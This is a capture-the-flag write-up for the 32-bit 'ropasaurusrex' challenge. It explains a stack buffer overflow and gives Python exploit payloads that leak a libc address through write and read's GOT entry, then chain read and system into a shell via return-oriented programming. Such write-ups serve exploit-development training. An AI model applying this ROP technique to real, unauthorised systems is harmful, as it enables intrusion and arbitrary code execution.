# ropasaurusrex

**Category:** ROP

## Overview

```text
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    Stripped:   No
    Debuginfo:  Yes
```

```text
void get_input()
{
  char buff[256]; // [esp+0h] [ebp-108h] BYREF

  write(1, "Input: ", 7u);
  read(0, buff, 512u);
}
```

In the code there is a buffer overflow in buff.
The binary is compiled with the stack not executable, so we cannot insert a shellcode inside the buffer.
The binary also doesn't have a win function.
The solution to this challenge is to use ROP (Return Oriented Programming)

Note that the binary is 32-bit.


## Analysis

Since the LIBC is PIE, we want a way to leak the base address of the LIBC.
This can be done by printing the GOT address of read to the screen.
Once we have the base of the LIBC, we can pop a shell by simply calling system with /bin/sh as an argument.


## Vulnerability
Buffer overflow in buff


## Exploitation

First leak the LIBC address by printing the GOT address of `read` to the screen:

```python
payload = b"A"*268 #to get to the return address
payload += p32(CHALL.plt["write"]) 
payload += p32(CHALL.symbols["main"]) #return address for write -> used to restart the main because there are no cycles in the code
payload += p32(1) # print to screen
payload += p32(CHALL.got["read"]) #we print to screen the address of read
payload += p32(4)
```

Now we pop a shell using system:

```python
ADD_ESP_12 = 0X0804901B #address of rop gadget : add esp, 8; pop ebx; ret; 

payload = b"A"*268
payload += p32(LIBC.symbols["read"]) #read used to store /bin/sh somewhere in memory
payload += p32(ADD_ESP_12) #return address for read, used to clean the stack
payload += p32(0) #std input
payload += p32(0x804c300) #where to store /bin/sh 
payload += p32(7) #length of /bin/sh

payload += p32(LIBC.symbols["system"])
payload += p32(0xdeadbeef)
payload += p32(0x804c300)
```

Now we pass /bin/sh to the read

```python
r.recvuntil(b"Input: ")
r.sendline(payload)
r.send(b"/bin/sh")
```



 

